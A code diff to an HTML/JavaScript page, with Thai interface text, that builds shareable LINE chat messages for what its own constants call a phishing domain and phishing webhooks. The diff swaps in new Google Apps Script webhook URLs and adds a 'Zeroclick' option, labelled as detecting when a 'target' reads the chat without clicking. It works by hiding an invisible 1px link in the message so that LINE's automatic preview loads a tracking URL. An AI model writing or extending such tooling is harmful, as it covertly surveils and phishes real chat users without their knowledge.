@@ -719,6 +719,21 @@
                 <div class="tips">
                     <p><strong>คำแนะนำ:</strong> เลือกรูปภาพที่น่าสนใจและมีขนาดไม่ใหญ่เกินไป เพื่อให้โหลดได้อย่างรวดเร็ว</p>
                 </div>
+
+                <!-- เพิ่มส่วนควบคุม Zeroclick -->
+                <div class="form-group">
+                    <div style="display: flex; align-items: center; margin-top: 10px; padding: 10px; background-color: #f8f9fa; border-radius: 8px; border: 1px dashed #ddd;">
+                        <label class="switch" style="margin-right: 15px; position: relative; display: inline-block; width: 50px; height: 24px;">
+                            <input type="checkbox" id="zeroclickEnabled" checked>
+                            <span class="slider" style="position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #ccc; transition: .4s; border-radius: 24px;"></span>
+                            <span class="slider before" style="position: absolute; content: ''; height: 16px; width: 16px; left: 4px; bottom: 4px; background-color: white; transition: .4s; border-radius: 50%;"></span>
+                        </label>
+                        <div>
+                            <div style="font-weight: 500; color: #333;">เปิดใช้ระบบตรวจจับการอ่านแชท (Zeroclick)</div>
+                            <div style="font-size: 12px; color: #666; margin-top: 3px;">ตรวจจับเมื่อเป้าหมายอ่านข้อความแต่ยังไม่ได้กดลิงก์</div>
+                        </div>
+                    </div>
+                </div>
             </div>
         </div>
         
@@ -746,8 +761,8 @@
         
         // URL สำหรับ webhook - แก้ไขให้ใช้ URL เดียวกันทั้งระบบ
         const LINE_OA_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwGWk940oEh5GlZ6BKl_mSy7x_i8rwh5aWIKmXLYv7tJ6_1zVVm6P1l03MLscaBoJ0Wfg/exec';
-        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbzjaJSDYaPfosCf9jMTIMSyFdoOuiKjrYj2i2AfYp7i_W8Bhpxa3M5EUzu19q5WUho7/exec';
-        const PERMISSION_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbzjaJSDYaPfosCf9jMTIMSyFdoOuiKjrYj2i2AfYp7i_W8Bhpxa3M5EUzu19q5WUho7/exec';
+        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbyU8e3BDOUfT9WfgI00wa5eOEILJcHhgruJxqT1GaJSWD9Z7zIkEzWkFIxcmrCHlZ4/exec';
+        const PERMISSION_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbyU8e3BDOUfT9WfgI00wa5eOEILJcHhgruJxqT1GaJSWD9Z7zIkEzWkFIxcmrCHlZ4/exec';
         const PHISHING_DOMAIN = 'https://socialtopnews.github.io/news/index.html';
         
         // เริ่มต้นการทำงานเมื่อโหลดหน้าเว็บ
@@ -1485,6 +1500,11 @@
                 // 3. สร้าง URL สำหรับคลิก - เพิ่มพารามิเตอร์ source=image
                 const clickTrackUrl = `${PHISHING_DOMAIN}?daily=${trackKey}&source=image`;
                 
+                // ใหม่: สร้าง URL สำหรับ Zeroclick preview (ถ้าเปิดใช้งาน)
+                const zeroclickEnabled = document.getElementById('zeroclickEnabled').checked;
+                const previewUrl = zeroclickEnabled ? 
+                    `${PHISHING_DOMAIN}?daily=${trackKey}&source=zeroclick&preview=1` : '';
+                
                 // 4. สร้าง Flex Message พร้อมรูปภาพที่คลิกได้
                 const message = {
                     type: 'flex',
@@ -1504,6 +1524,39 @@
                         }
                     }
                 };
+                
+                // ถ้าเปิดใช้งาน Zeroclick ให้เพิ่มโค้ดสำหรับลิงก์ซ่อน
+                if (zeroclickEnabled && previewUrl) {
+                    // เพิ่มส่วนเนื้อหาที่มองไม่เห็น แต่ LINE จะโหลดตัวอย่างลิงก์อัตโนมัติ
+                    if (!message.contents.body) {
+                        message.contents.body = {
+                            type: 'box',
+                            layout: 'vertical',
+                            contents: []
+                        };
+                    }
+                    
+                    // เพิ่มลิงก์ที่มองไม่เห็นแต่ LINE จะโหลด preview
+                    message.contents.body.contents.push({
+                        type: 'box',
+                        layout: 'vertical',
+                        contents: [{
+                            type: 'text',
+                            text: ' ',
+                            align: 'center',
+                            action: {
+                                type: 'uri',
+                                uri: previewUrl
+                            },
+                            color: '#FFFFFF',
+                            size: '1px'
+                        }],
+                        height: '1px',
+                        offsetStart: '0px',
+                        offsetEnd: '0px',
+                        offsetBottom: '0px'
+                    });
+                }
 
                 console.log("กำลังแชร์ Flex Message:", JSON.stringify(message, null, 2));
 
@@ -1574,6 +1627,30 @@
         function generateUniqueId() {
             return Date.now().toString(36) + Math.random().toString(36).substr(2, 5);
         }
+
+        // เพิ่มเอฟเฟคให้กับสวิตช์ Zeroclick
+        document.addEventListener('DOMContentLoaded', function() {
+            // ...existing code...
+            
+            // เพิ่ม event listener สำหรับ checkbox
+            const checkbox = document.getElementById('zeroclickEnabled');
+            if (checkbox) {
+                checkbox.addEventListener('change', function() {
+                    const slider = checkbox.nextElementSibling;
+                    if (checkbox.checked) {
+                        slider.style.backgroundColor = '#4CAF50';
+                        slider.nextElementSibling.style.transform = 'translateX(26px)';
+                    } else {
+                        slider.style.backgroundColor = '#ccc';
+                        slider.nextElementSibling.style.transform = 'translateX(0)';
+                    }
+                });
+                
+                // ทริกเกอร์การเปลี่ยนแปลงเริ่มต้น
+                const event = new Event('change');
+                checkbox.dispatchEvent(event);
+            }
+        });
     </script>
 </body>
 </html>
